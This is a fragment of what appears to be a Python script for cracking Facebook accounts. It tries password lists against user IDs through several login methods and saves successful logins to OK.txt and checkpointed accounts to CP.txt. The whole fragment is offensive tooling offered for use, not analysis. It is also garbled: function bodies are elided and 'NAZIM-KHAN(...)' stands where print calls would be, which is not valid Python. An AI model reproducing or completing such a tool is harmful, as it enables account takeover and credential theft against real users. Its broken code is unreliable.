...
class __crack__:
	...
	def plerr(self):
		...
		if _jokowi_kontol_ in ('M', 'm'):
				...
				if pwek == '':
					...
					def _sempak_(bse=None):
						...
						if boy == '':
							...
							NAZIM-KHAN('[•] Result CP saved to CP.txt')
							NAZIM-KHAN('\n\tCrack Processing...\n')
							NAZIM-KHAN('\n\tCrack Processing...\n\n');logo()
							...
							exit()
					NAZIM-KHAN('\n01.) Metode b-api ')
				   NAZIM-KHAN('02.) Metode mbasic ')
					NAZIM-KHAN('03.) Metode Mobile ')
					_sempak_(pwek.split(','))
					break
			...
			IMTIAZ_AKING('\n\t------[ Method Crack ]-----')
			print (' [*]=============================================')
			NAZIM-KHAN(' [1] AKING Method 1 ')
			NAZIM-KHAN(' [2] AKING Method 2  [ Pro ]')
			NAZIM-KHAN(' [3] AKING Method 3   ')
			print (' [*]=============================================')
			self.__pler__()
		else:
			exit()
	...
	def __api__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if "access_token" in p:
				NAZIM-KHAN('\r\033[1;92m[Successful-✓] %s | %s%s      '%(user,pw,tahun(user)))
	...
	def __mfb__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				NAZIM-KHAN('\r\033[1;92m[Successful-✓] %s | %s      '%(user,pw))
				wrt = '%s - %s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
				...
				try:
					...
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month]
					NAZIM-KHAN('\r\033[1;91m[Checkpoint] %s | %s  %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					...
					pass
				NAZIM-KHAN('\r\033[1;91m[Checkpoint] %s | %s%s      ' % (user,pw,tahun(user)))
				wrt = '%s - %s%s'%(user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
